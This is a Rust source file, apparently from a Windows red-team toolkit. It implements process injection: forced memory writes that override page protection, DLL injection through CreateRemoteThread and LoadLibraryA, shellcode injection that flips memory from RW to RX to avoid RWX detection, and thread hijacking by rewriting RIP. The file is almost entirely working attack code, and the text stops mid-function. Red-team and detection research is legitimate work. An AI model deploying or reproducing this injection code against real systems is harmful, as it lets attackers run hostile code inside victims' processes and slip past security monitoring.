//! Process injection and advanced operations

pub mod callback;
pub mod dll;
pub mod earlybird;
pub mod hollow;
pub mod hook;
pub mod obfuscate;
pub mod phantom;
pub mod poolparty;
pub mod shellcode;
pub mod stomping;
pub mod thread;
pub mod threadless;
pub mod workitem;
pub mod wow64;

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use crate::util::parse_address;
use serde_json::Value;

fn provenance_json(args: &Value) -> Value {
    serde_json::json!({
        "correlation_id": crate::observability::correlation_id_from_args(args),
        "request_id": args.get("request_id").cloned().unwrap_or(Value::Null),
        "task_id": args.get("task_id").cloned().unwrap_or(Value::Null),
        "chain_id": args.get("chain_id").cloned().unwrap_or(Value::Null),
        "purpose": args.get("purpose").cloned().unwrap_or(Value::Null),
    })
}

fn restore_removed_iat_hook_pointer_rollback(
    pid: u64,
    iat_address: u64,
    original_address: u64,
    replaced_address: Option<u64>,
) -> Value {
    let iat_address_json = crate::memory::rollback::format_address(iat_address);
    let original_address_json = crate::memory::rollback::format_address(original_address);

    let Some(replaced_address) = replaced_address else {
        return serde_json::json!({
            "available": false,
            "strategy": "none",
            "captured_fields": ["pid", "iat_address", "original_address"],
            "iat_address": iat_address_json,
            "original_address": original_address_json,
            "hook_address": Value::Null,
            "args": Value::Null,
            "action": Value::Null,
            "detail": "remove_iat could not capture the hook pointer before restoring the original IAT pointer",
        });
    };

    let hook_address_json = crate::memory::rollback::format_address(replaced_address);
    let action_args = serde_json::json!({
        "pid": pid,
        "iat_address": iat_address_json,
        "original_address": hook_address_json,
    });

    serde_json::json!({
        "available": true,
        "strategy": "restore_removed_iat_hook_pointer",
        "captured_fields": ["pid", "iat_address", "hook_address"],
        "iat_address": action_args["iat_address"],
        "original_address": original_address_json,
        "hook_address": action_args["original_address"],
        "args": action_args.clone(),
        "action": {
            "tool": "hook",
            "action": "remove_iat",
            "args": action_args,
        },
        "detail": "remove_iat captured the hook pointer before restoring the original IAT pointer",
    })
}

/// Force write memory - aggressive version with automatic protection bypass
pub fn force_write(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE};
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
        PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let bytes = args
        .get("bytes")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing bytes".to_string()))?;

    tracing::warn!(
        "[REDTEAM] Force writing {} bytes to {:#x} in PID {}",
        bytes.len(),
        address,
        pid
    );

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let byte_vec: Vec<u8> = bytes
            .iter()
            .filter_map(|v| v.as_u64())
            .map(|v| v as u8)
            .collect();

        let original =
            crate::memory::rollback::capture_original_bytes(*handle, address, byte_vec.len());

        // Always bypass protection
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        let protect_result = VirtualProtectEx(
            *handle,
            address as *mut _,
            byte_vec.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        tracing::debug!("VirtualProtectEx result: {:?}", protect_result.is_ok());

        let mut bytes_written = 0usize;
        WriteProcessMemory(
            *handle,
            address as *mut _,
            byte_vec.as_ptr() as *const _,
            byte_vec.len(),
            Some(&mut bytes_written),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to write memory: {}", e)))?;

        // Restore original protection
        let captured_old_protect = old_protect;
        let mut restored_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtectEx(
            *handle,
            address as *mut _,
            byte_vec.len(),
            captured_old_protect,
            &mut restored_protect,
        );

        Ok(serde_json::json!({
            "pid": pid,
            "address": format!("0x{:016X}", address),
            "bytes_written": bytes_written,
            "success": true,
            "protection_bypassed": true,
            "old_protect": captured_old_protect.0,
            "rollback": crate::memory::rollback::restore_original_bytes_rollback(
                pid,
                address,
                &original,
                Some(captured_old_protect.0),
                true,
            ),
            "provenance": provenance_json(args)
        }))
    }
}

/// Inject DLL into process
pub fn inject_dll(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let dll_path = args
        .get("dll_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing dll_path".to_string()))?;

    tracing::warn!("[REDTEAM] Injecting DLL into PID {}: {}", pid, dll_path);

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Get LoadLibraryA address
        let kernel32 =
            GetModuleHandleA(windows::core::PCSTR(b"kernel32.dll\0".as_ptr())).unwrap_or_default();
        let load_library_addr =
            GetProcAddress(kernel32, windows::core::PCSTR(b"LoadLibraryA\0".as_ptr()));

        if load_library_addr.is_none() {
            return Err(MemoricError::InjectionFailed(
                "Failed to get LoadLibraryA address".to_string(),
            ));
        }

        // Allocate memory in remote process
        let mem_size = (dll_path.len() + 1) * std::mem::size_of::<u8>();
        let remote_mem = windows::Win32::System::Memory::VirtualAllocEx(
            *handle,
            None,
            mem_size,
            windows::Win32::System::Memory::MEM_COMMIT
                | windows::Win32::System::Memory::MEM_RESERVE,
            windows::Win32::System::Memory::PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Failed to allocate memory".to_string(),
            ));
        }

        // Write DLL path to remote process
        WriteProcessMemory(
            *handle,
            remote_mem,
            dll_path.as_ptr() as *const _,
            mem_size,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to write memory: {}", e)))?;

        // Create remote thread
        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(std::mem::transmute(load_library_addr.unwrap())),
            Some(remote_mem),
            0,
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to create remote thread: {}", e))
        })?;

        // Wait for thread to complete
        windows::Win32::System::Threading::WaitForSingleObject(
            thread,
            windows::Win32::System::Threading::INFINITE,
        );

        tracing::info!("DLL injection successful");

        Ok(serde_json::json!({
            "success": true,
            "message": "DLL injected successfully",
            "pid": pid,
            "dll_path": dll_path
        }))
    }
}

/// Inject shellcode into process (W^X compliant)
pub fn inject_shellcode(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing shellcode".to_string()))?;

    tracing::warn!(
        "[REDTEAM] Injecting shellcode into PID {} ({} bytes)",
        pid,
        shellcode.len()
    );

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let shellcode_bytes: Vec<u8> = shellcode
            .iter()
            .filter_map(|v| v.as_u64())
            .map(|v| v as u8)
            .collect();

        // Allocate as RW — avoid RWX pattern
        let alloc_size = shellcode_bytes.len() + (std::process::id() as usize % 512 + 64);
        let remote_mem = VirtualAllocEx(
            *handle,
            None,
            alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Failed to allocate memory".to_string(),
            ));
        }

        // Write while RW
        WriteProcessMemory(
            *handle,
            remote_mem,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to write memory: {}", e)))?;

        // Flip to RX
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            remote_mem,
            alloc_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to set RX: {}", e)))?;

        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(std::mem::transmute(remote_mem)),
            None,
            0,
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to create remote thread: {}", e))
        })?;
        let _thread = SafeHandle::new(thread);

        tracing::info!("Shellcode injection successful (W^X)");

        Ok(serde_json::json!({
            "success": true,
            "message": "Shellcode injected (W^X compliant)",
            "pid": pid,
            "shellcode_address": format!("0x{:016X}", remote_mem as usize),
            "shellcode_size": shellcode_bytes.len(),
            "protection": "RW→RX"
        }))
    }
}

// ============================================================================
// Thread Hijacking Implementation
// ============================================================================

/// Enumerate threads in a target process (for hijacking selection)
/// Task 1.1: Create thread enumeration function
pub fn enumerate_threads(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let prefer_idle = args
        .get("prefer_idle")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    tracing::debug!("Enumerating threads for thread hijacking in PID {}", pid);

    let mut threads = Vec::new();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create snapshot: {}", e)))?;

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        if Thread32First(snapshot, &mut entry).is_ok() {
            loop {
                if entry.th32OwnerProcessID == pid as u32 {
                    threads.push(serde_json::json!({
                        "tid": entry.th32ThreadID,
                        "base_priority": entry.tpBasePri,
                        "delta_priority": entry.tpDeltaPri,
                    }));
                }

                if Thread32Next(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
    }

    // If prefer_idle, sort by lowest priority (idle threads are better targets)
    if prefer_idle {
        threads.sort_by(|a, b| {
            let pa = a["base_priority"].as_i64().unwrap_or(0);
            let pb = b["base_priority"].as_i64().unwrap_or(0);
            pa.cmp(&pb)
        });
    }

    let recommended = threads.first().and_then(|t| t["tid"].as_u64());

    tracing::info!(
        "Found {} threads in PID {}, recommended TID: {:?}",
        threads.len(),
        pid,
        recommended
    );

    Ok(serde_json::json!({
        "pid": pid,
        "count": threads.len(),
        "threads": threads,
        "recommended_tid": recommended,
        "note": "Recommended thread has lowest priority (likely idle)"
    }))
}

/// Backup thread context before hijacking
/// Task 1.2: Implement thread context backup
pub fn backup_thread_context(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, CONTEXT as WIN_CONTEXT, CONTEXT_ALL_AMD64,
    };
    use windows::Win32::System::Threading::{
        OpenThread, SuspendThread, THREAD_GET_CONTEXT, THREAD_SUSPEND_RESUME,
    };

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing tid".to_string()))?;

    tracing::debug!("Backing up thread context for TID {}", tid);

    unsafe {
        let handle = OpenThread(
            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open thread: {}", e)))?;

        // Suspend the thread first
        let prev_count = SuspendThread(handle);
        if prev_count == u32::MAX {
            return Err(MemoricError::WindowsApi(
                "Failed to suspend thread".to_string(),
            ));
        }

        // Get thread context
        let mut context: WIN_CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_ALL_AMD64;

        GetThreadContext(handle, &mut context).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to get thread context: {}", e))
        })?;

        // Extract key registers for backup
        Ok(serde_json::json!({
            "success": true,
            "tid": tid,
            "suspended": true,
            "previous_suspend_count": prev_count,
            "context": {
                "rip": format!("0x{:016X}", context.Rip),
                "rsp": format!("0x{:016X}", context.Rsp),
                "rbp": format!("0x{:016X}", context.Rbp),
                "rax": format!("0x{:016X}", context.Rax),
                "rbx": format!("0x{:016X}", context.Rbx),
                "rcx": format!("0x{:016X}", context.Rcx),
                "rdx": format!("0x{:016X}", context.Rdx),
                "rsi": format!("0x{:016X}", context.Rsi),
                "rdi": format!("0x{:016X}", context.Rdi),
                "r8": format!("0x{:016X}", context.R8),
                "r9": format!("0x{:016X}", context.R9),
                "r10": format!("0x{:016X}", context.R10),
                "r11": format!("0x{:016X}", context.R11),
                "r12": format!("0x{:016X}", context.R12),
                "r13": format!("0x{:016X}", context.R13),
                "r14": format!("0x{:016X}", context.R14),
                "r15": format!("0x{:016X}", context.R15),
                "eflags": format!("0x{:08X}", context.EFlags),
                "context_flags": format!("0x{:08X}", context.ContextFlags.0),
            },
            "message": "Thread suspended and context backed up. Use restore_thread_context to restore."
        }))
    }
}

/// Thread hijack core logic - modify RIP to execute shellcode
/// Task 1.3: Implement thread hijack core logic
pub fn thread_hijack(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, SetThreadContext, CONTEXT as WIN_CONTEXT, CONTEXT_ALL_AMD64,
    };
    use windows::Win32::System::Threading::{
        OpenThread, ResumeThread, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
    };

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing tid".to_string()))?;
    let shellcode_address = args
        .get("shellcode_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode_address".to_string()))?;
    let resume = args.get("resume").and_then(|v| v.as_bool()).unwrap_or(true);

    tracing::warn!(
        "[REDTEAM] Thread hijacking: TID {} -> shellcode at 0x{:016X}",
        tid,
        shellcode_address
    );

    unsafe {
        let handle = OpenThread(
            THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open thread: {}", e)))?;

        // Thread should already be suspended by backup_thread_context
        // Get current context
        let mut context: WIN_CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_ALL_AMD64;

        GetThreadContext(handle, &mut context).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to get thread context: {}", e))
        })?;

        let original_rip = context.Rip;

        // Modify RIP to point to our shellcode
        context.Rip = shellcode_address;

        // Set modified context
        SetThreadContext(handle, &context).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to set thread context: {}", e))
        })?;

        let mut resumed = false;
        if resume {
            let prev_count = ResumeThread(handle);
            if prev_count != u32::MAX {
                resumed = true;
            }
        }

        tracing::info!(
            "Thread {} hijacked: RIP 0x{:016X} -> 0x{:016X}",
            tid,
            original_rip,
            shellcode_address
        );

        Ok(serde_json::json!({
            "success": true,
            "tid": tid,
            "original_rip": format!("0x{:016X}", original_rip),
            "new_rip": format!("0x{:016X}", shellcode_address),
            "resumed": resumed,
            "message": "Thread hijacked successfully. No new thread created."
        }))
    }
}

/// Restore thread context after hijacking
/// Task 1.4: Add thread context restoration
pub fn restore_thread_context(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        SetThreadContext, CONTEXT as WIN_CONTEXT, CONTEXT_ALL_AMD64,
    };
    use windows::Win32::System::Threading::{
        OpenThread, ResumeThread, SuspendThread, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT,
        THREAD_SUSPEND_RESUME,
    };

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing tid".to_string()))?;
    let ctx = args
        .get("context")
        .ok_or_else(|| MemoricError::InjectionFailed("Missing context".to_string()))?;

    tracing::info!("Restoring thread context for TID {}", tid);

    // Parse register values from hex strings
    let parse_hex = |key: &str| -> u64 {
        ctx.get(key)
            .and_then(|v| v.as_str())
            .and_then(|s| {
                u64::from_str_radix(s.trim_start_matches("0x").trim_start_matches("0X"), 16).ok()
            })
            .unwrap_or(0)
    };

    unsafe {
        let handle = OpenThread(
            THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open thread: {}", e)))?;

        // Suspend thread if it's running
        SuspendThread(handle);

        // Build context from saved values
        let mut context: WIN_CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_ALL_AMD64;
        context.Rip = parse_hex("rip");
        context.Rsp = parse_hex("rsp");
        context.Rbp = parse_hex("rbp");
        context.Rax = parse_hex("rax");
        context.Rbx = parse_hex("rbx");
        context.Rcx = parse_hex("rcx");
        context.Rdx = parse_hex("rdx");
        context.Rsi = parse_hex("rsi");
        context.Rdi = parse_hex("rdi");
        context.R8 = parse_hex("r8");
        context.R9 = parse_hex("r9");
        context.R10 = parse_hex("r10");
        context.R11 = parse_hex("r11");
        context.R12 = parse_hex("r12");
        context.R13 = parse_hex("r13");
        context.R14 = parse_hex("r14");
        context.R15 = parse_hex("r15");
        context.EFlags = parse_hex("eflags") as u32;

        // Set restored context
        SetThreadContext(handle, &context).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to set thread context: {}", e))
        })?;

        // Resume thread
        let prev_count = ResumeThread(handle);

        Ok(serde_json::json!({
            "success": true,
            "tid": tid,
            "restored_rip": format!("0x{:016X}", context.Rip),
            "resumed": prev_count != u32::MAX,
            "message": "Thread context restored and thread resumed"
        }))
    }
}

/// Wait for thread execution completion after hijacking
/// Task 1.5: Add execution waiting and result retrieval
pub fn wait_for_thread_execution(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::WAIT_OBJECT_0;
    use windows::Win32::System::Threading::GetExitCodeThread;
    use windows::Win32::System::Threading::{
        OpenThread, WaitForSingleObject, THREAD_QUERY_INFORMATION, THREAD_SYNCHRONIZE,
    };

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing tid".to_string()))?;
    let timeout_ms = args
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(5000) as u32;

    tracing::debug!(
        "Waiting for thread {} execution (timeout: {}ms)",
        tid,
        timeout_ms
    );

    unsafe {
        let handle = OpenThread(
            THREAD_SYNCHRONIZE | THREAD_QUERY_INFORMATION,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open thread: {}", e)))?;

        let wait_result = WaitForSingleObject(handle, timeout_ms);

        let mut exit_code = 0u32;
        let _ = GetExitCodeThread(handle, &mut exit_code);

        let completed = wait_result == WAIT_OBJECT_0;

        Ok(serde_json::json!({
            "tid": tid,
            "completed": completed,
            "timed_out": !completed,
            "exit_code": exit_code,
            "still_active": exit_code == 259, // STILL_ACTIVE
            "message": if completed { "Thread execution completed" } else { "Wait timed out - thread may still be running" }
        }))
    }
}

// ============================================================================
// Execution Control Enhancement
// ============================================================================

/// Wait for injection execution to complete
/// Task 4.1: Implement wait for completion
pub fn wait_for_execution(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{HANDLE, WAIT_OBJECT_0};
    use windows::Win32::System::Threading::WaitForSingleObject;

    let thread_handle = args
        .get("thread_handle")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing thread_handle".to_string()))?;
    let timeout_ms = args
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(30000) as u32;

    tracing::debug!(
        "Waiting for execution (handle: {}, timeout: {}ms)",
        thread_handle,
        timeout_ms
    );

    unsafe {
        let handle = HANDLE(thread_handle as *mut std::ffi::c_void);
        let wait_result = WaitForSingleObject(handle, timeout_ms);
        let completed = wait_result == WAIT_OBJECT_0;

        Ok(serde_json::json!({
            "completed": completed,
            "timed_out": !completed,
            "thread_handle": thread_handle,
            "timeout_ms": timeout_ms,
            "message": if completed { "Execution completed" } else { "Wait timed out" }
        }))
    }
}

/// Get exit code from a completed thread
/// Task 4.2: Add exit code retrieval
pub fn get_exit_code(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::Threading::GetExitCodeThread;

    let thread_handle = args
        .get("thread_handle")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing thread_handle".to_string()))?;

    tracing::debug!("Getting exit code for thread handle {}", thread_handle);

    unsafe {
        let handle = HANDLE(thread_handle as *mut std::ffi::c_void);
        let mut exit_code = 0u32;

        GetExitCodeThread(handle, &mut exit_code)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get exit code: {}", e)))?;

        let still_active = exit_code == 259; // STILL_ACTIVE

        Ok(serde_json::json!({
            "thread_handle": thread_handle,
            "exit_code": exit_code,
            "exit_code_hex": format!("0x{:08X}", exit_code),
            "still_active": still_active,
            "message": if still_active { "Thread is still running" } else { "Thread has exited" }
        }))
    }
}

/// Shared memory result storage - allocate shared memory for injection results
/// Task 4.3: Implement shared memory result storage
pub fn shared_memory_result(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
        PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let action = args
        .get("action")
        .and_then(|v| v.as_str())
        .unwrap_or("allocate");
    let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(4096) as usize;

    // Size limit: max 10MB
    const MAX_RESULT_SIZE: usize = 10 * 1024 * 1024;
    if size > MAX_RESULT_SIZE {
        return Err(MemoricError::InjectionFailed(format!(
            "Size {} exceeds max allowed {} bytes (10MB)",
            size, MAX_RESULT_SIZE
        )));
    }

    tracing::debug!(
        "Shared memory result: action={} pid={} size={}",
        action,
        pid,
        size
    );

    // Enable debug privilege for cross-process access
    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        match action {
            "allocate" => {
                let mem = VirtualAllocEx(
                    *handle,
                    None,
                    size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );

                if mem.is_null() {
                    return Err(MemoricError::InjectionFailed(
                        "Failed to allocate shared memory".to_string(),
                    ));
                }

                // Zero-initialize
                let zeros = vec![0u8; size];
                WriteProcessMemory(*handle, mem, zeros.as_ptr() as *const _, size, None).ok();

                Ok(serde_json::json!({
                    "success": true,
                    "action": "allocate",
                    "address": format!("0x{:016X}", mem as usize),
                    "size": size,
                    "message": "Shared memory allocated. Shellcode should write results here."
                }))
            }
            "read" => {
                let address = args.get("address").and_then(parse_address).ok_or_else(|| {
                    MemoricError::InjectionFailed("Missing address for read".to_string())
                })?;

                let mut buffer = vec![0u8; size];
                let mut bytes_read = 0usize;

                ReadProcessMemory(
                    *handle,
                    address as *const _,
                    buffer.as_mut_ptr() as *mut _,
                    size,
                    Some(&mut bytes_read),
                )
                .map_err(|e| {
                    MemoricError::InjectionFailed(format!("Failed to read shared memory: {}", e))
                })?;

                buffer.truncate(bytes_read);

                // Try to interpret as string first
                let as_string = String::from_utf8_lossy(&buffer)
                    .trim_end_matches('\0')
                    .to_string();
                let hex: String = buffer.iter().map(|b| format!("{:02X}", b)).collect();

                Ok(serde_json::json!({
                    "success": true,
                    "action": "read",
                    "address": format!("0x{:016X}", address),
                    "bytes_read": bytes_read,
                    "hex": hex,
                    "as_string": as_string,
                    "raw_bytes": buffer.iter().map(|b| *b as u64).collect::<Vec<_>>()
                }))
            }
            _ => Err(MemoricError::InjectionFailed(format!(
                "Unknown action: {}. Use 'allocate' or 'read'",
                action
            ))),
        }
    }
}

/// Automatic resource cleanup after injection
/// Task 4.4: Add automatic resource cleanup
pub fn cleanup_injection(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::System::Memory::{VirtualFreeEx, MEM_RELEASE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let addresses = args.get("addresses").and_then(|v| v.as_array());
    let thread_handles = args.get("thread_handles").and_then(|v| v.as_array());

    tracing::info!("Cleaning up injection resources in PID {}", pid);

    let mut freed_addresses = Vec::new();
    let mut closed_handles = Vec::new();
    let mut errors = Vec::new();

    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Free allocated memory regions
        if let Some(addrs) = addresses {
            for addr_val in addrs {
                if let Some(addr) = addr_val.as_u64() {
                    let result = VirtualFreeEx(*handle, addr as *mut _, 0, MEM_RELEASE);
                    if result.is_ok() {
                        freed_addresses.push(format!("0x{:016X}", addr));
                    } else {
                        errors.push(format!("Failed to free 0x{:016X}", addr));
                    }
                }
            }
        }

        // Close thread handles
        if let Some(handles) = thread_handles {
            for handle_val in handles {
                if let Some(h) = handle_val.as_u64() {
                    let th = HANDLE(h as *mut std::ffi::c_void);
                    if CloseHandle(th).is_ok() {
                        closed_handles.push(h);
                    } else {
                        errors.push(format!("Failed to close handle {}", h));
                    }
                }
            }
        }
    }

    Ok(serde_json::json!({
        "success": errors.is_empty(),
        "freed_addresses": freed_addresses,
        "closed_handles": closed_handles,
        "errors": errors,
        "message": format!("Cleaned up {} addresses, {} handles", freed_addresses.len(), closed_handles.len())
    }))
}

// ============================================================================
// Shellcode Parameter Passing
// ============================================================================

/// Setup registers for parameter passing (x64 calling convention)
/// Task 5.1: Implement register-based parameter passing
pub fn setup_registers(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, SetThreadContext, CONTEXT as WIN_CONTEXT, CONTEXT_ALL_AMD64,
    };
    use windows::Win32::System::Threading::{
        OpenThread, ResumeThread, SuspendThread, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT,
        THREAD_SUSPEND_RESUME,
    };

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing tid".to_string()))?;
    let rcx = args.get("rcx").and_then(|v| v.as_u64());
    let rdx = args.get("rdx").and_then(|v| v.as_u64());
    let r8 = args.get("r8").and_then(|v| v.as_u64());
    let r9 = args.get("r9").and_then(|v| v.as_u64());

    tracing::debug!(
        "Setting up registers for TID {}: RCX={:?} RDX={:?} R8={:?} R9={:?}",
        tid,
        rcx,
        rdx,
        r8,
        r9
    );

    unsafe {
        let handle = OpenThread(
            THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open thread: {}", e)))?;

        // Suspend thread
        SuspendThread(handle);

        // Get current context
        let mut context: WIN_CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_ALL_AMD64;

        GetThreadContext(handle, &mut context).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to get thread context: {}", e))
        })?;

        // Set x64 calling convention registers
        if let Some(v) = rcx {
            context.Rcx = v;
        }
